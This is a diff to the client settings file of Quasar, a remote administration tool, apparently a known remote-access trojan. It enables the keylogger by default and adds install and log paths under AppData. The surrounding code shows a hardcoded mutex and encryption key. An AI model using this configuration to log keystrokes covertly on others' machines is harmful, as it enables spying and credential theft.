@@ -1,6 +1,7 @@
 ﻿using Quasar.Common.Cryptography;
 using Quasar.Common.Helpers;
 using System;
+using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -23,7 +24,7 @@ namespace Quasar.Client.Config
         public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
         public static string STARTUPKEY = "Test key";
         public static bool HIDEFILE = false;
-        public static bool ENABLELOGGER = false;
+        public static bool ENABLELOGGER = true;
         public static string ENCRYPTIONKEY = "-.)4>[=u%5G3hY3&";
         public static string TAG = "DEBUG";
         public static string LOGDIRECTORYNAME = "Logs";
@@ -32,6 +33,8 @@ namespace Quasar.Client.Config
         public static X509Certificate2 SERVERCERTIFICATE;
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
+        public static string INSTALLPATH = "";
+        public static string LOGSPATH = "";
 
         public static bool Initialize()
         {
@@ -82,6 +85,10 @@ namespace Quasar.Client.Config
 
         static void FixDirectory()
         {
+            // set up paths
+            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
+            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
+
             if (PlatformHelper.Is64Bit) return;
 
             // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
